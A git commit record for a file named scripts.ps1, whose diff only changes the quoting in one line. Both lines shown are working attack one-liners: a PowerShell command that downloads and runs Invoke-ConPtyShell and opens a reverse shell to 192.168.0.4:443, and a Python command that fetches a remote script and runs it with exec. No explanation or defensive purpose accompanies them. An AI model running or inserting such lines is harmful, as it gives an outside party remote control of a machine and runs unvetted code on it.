cb5985d4bb3ab2bca7ae361f9973f5830ad674a0
AndresFelipeGualdron <gualdronsito@hotmail.com>
2021-10-02 20:22:58 -0500

    update

--- scripts.ps1
+++ scripts.ps1
@@ -1,2 +1,2 @@
 IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.0.4 443
-python -c 'import requests;r=requests.get("https://raw.githubusercontent.com/AndresFelipeGualdron/scripts/master/remote.py");exec(r.text)'
+python -c "import requests;r=requests.get('https://raw.githubusercontent.com/AndresFelipeGualdron/scripts/master/remote.py');exec(r.text)"
